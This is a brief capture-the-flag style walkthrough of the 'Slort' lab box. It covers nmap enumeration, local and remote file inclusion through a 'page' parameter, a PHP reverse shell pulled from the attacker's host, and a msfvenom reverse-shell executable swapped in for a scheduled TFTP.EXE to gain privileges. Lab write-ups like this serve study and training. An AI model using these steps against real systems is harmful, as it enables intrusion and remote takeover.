# Slort

### Enumeration

```
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.153.53:4443/dashboard/
```

/site - URL

Theme and contents:

[https://freehtml5.co/p-preview/?item=beryllium-free-architect-html5-template-built-with-bootstrap](https://freehtml5.co/p-preview/?item=beryllium-free-architect-html5-template-built-with-bootstrap)

http://192.168.153.53:4443/site/index.php?page=main.php

page parameter - LFI or RFI?

?page=\WINDOWS\system32\drivers\etc\hosts - LFI ok.

?page=http://192.168.49.153 - RFI ok.

### Initial Access

[https://www.revshells.com/](https://www.revshells.com) - Ivan Sincek - 80 - cmd -> shell.php

[http://192.168.153.53:4443/site/index.php?page=http://192.168.49.153:8080/shell.php](http://192.168.153.53:4443/site/index.php?page=http://192.168.49.153:8080/shell.php)

### PrivEsc

```
C:\Backup>type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

C:\Backup>icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files
```

So we can replace TFTP.EXE file with executable.

```
//$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.153 LPORT=80 -f exe -o TFTP.EXE
```
